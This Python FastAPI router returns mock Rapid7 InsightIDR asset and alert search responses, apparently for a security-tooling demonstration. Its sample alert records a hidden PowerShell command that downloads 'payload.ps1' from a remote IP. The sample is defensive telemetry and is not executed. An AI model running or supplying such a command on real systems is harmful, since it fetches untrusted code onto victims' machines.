from fastapi import APIRouter
from pydantic import BaseModel

router = APIRouter(prefix="/api/v1/rapid7", tags=["rapid7"])


class SearchAssetsRequest(BaseModel):
    hostname: str


class SearchAlertsRequest(BaseModel):
    asset_rrn: str

"""
This is a mock response from Rapid7 InsightIDR for demonstration purposes.
The asset search is the first step, then using the asset ID to query alerts per asset
"""
@router.post("/search_assets")
def search_assets(body: SearchAssetsRequest):
    return {
      "data": [
        {
          "rrn": "rrn:asset:us:12345678-90ab-cdef-1234-567890abcdef:asset:9f31f5b4-8f7d-4fb3-bb0d-8d2e8df82b72",
          "id": "9f31f5b4-8f7d-4fb3-bb0d-8d2e8df82b72",
          "host_name": body.hostname,
          "ip_address": "10.42.18.55",
          "mac_address": "00:50:56:A1:B2:C3",
          "os": "Windows 11 Enterprise",
          "domain": "CORP",
          "agent_present": True,
          "restricted": False,
          "last_seen": "2026-03-14T13:41:22Z",
          "primary_user": {
            "name": "John Doe",
            "account": "CORP\\jdoe"
          },
          "metrics": {
            "unique_processes_24h": 148,
            "data_collection_issues": 0
          }
        }
      ],
      "page": {
        "size": 1,
        "total": 1
      }
    }

"""
This is a mock response from Rapid7 InsightIDR for demonstration purposes.
This is an alert search using an identifier from the asset search to dig deeper on a specific asset.
"""
@router.post("/search_alerts")
def search_alerts(body: SearchAlertsRequest):
    return {
        "data": [
            {
                "event_time": "2026-03-14T13:41:58Z",
                "event_type": "process_start",
                "asset_rrn": body.asset_rrn,
                "host_name": "WS-ACCT-0142",
                "user": "CORP\\jdoe",
                "process_name": "powershell.exe",
                "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "command_line": "powershell.exe -nop -w hidden -c Invoke-WebRequest http://10.51.100.25/payload.ps1",
                "parent_process_name": "cmd.exe",
                "remote_ip": "10.51.100.25",
                "remote_port": 80,
                "alert_id": "alert-7b1b5c2e-4d36-4f3b-8b18-29e3a30b6a11"
            }
        ]
    }
